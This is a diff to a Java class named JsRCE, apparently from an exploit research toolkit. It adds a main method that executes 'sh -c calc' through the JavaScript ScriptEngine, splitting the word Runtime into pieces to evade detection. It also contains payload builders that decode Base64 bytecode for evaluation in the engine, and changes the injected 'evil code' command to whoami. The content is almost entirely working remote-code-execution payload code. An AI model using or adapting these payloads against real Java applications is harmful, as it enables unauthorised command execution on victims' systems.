@@ -6,13 +6,16 @@ import javassist.CtConstructor;
 
 import javax.script.ScriptEngineManager;
 import java.util.Base64;
-
-public class JsRCE {
+import com.fasterxml.jackson.databind.util.ClassUtil;
+public class JsRCE  {
 
     public static void main(String[] args) throws Exception {
-        JsRCE jsRCE = new JsRCE();
-        jsRCE.jsTest();
+//        JsRCE jsRCE = new JsRCE();
+//        jsRCE.jsTest();
+        ScriptEngineManager manager = new ScriptEngineManager();
+        manager.getEngineByName("js").eval("var s = [3];s[0] = \"sh\";s[1] = \"-c\";s[2] = \"calc\";var p = java.lang.Run"+"time.getRu"+"ntime().exec(s);");
     }
+
     public static String getJsPayload2(String code) throws Exception {
         return "var data = '" + code + "';" +
                 "var bytes = java.util.Base64.getDecoder().decode(data);" +
@@ -36,7 +39,7 @@ public class JsRCE {
     }
     public void jsTest() throws Exception {
         ScriptEngineManager manager = new ScriptEngineManager();
-        manager.getEngineByName("js").eval(getJsPayload5(Base64.getEncoder().encodeToString(getEvilCode("calc"))));
+        manager.getEngineByName("js").eval(getJsPayload5(Base64.getEncoder().encodeToString(getEvilCode("whoami"))));
     }
     //JDK<=11
     public static String getJsPayload3(String code) throws Exception {
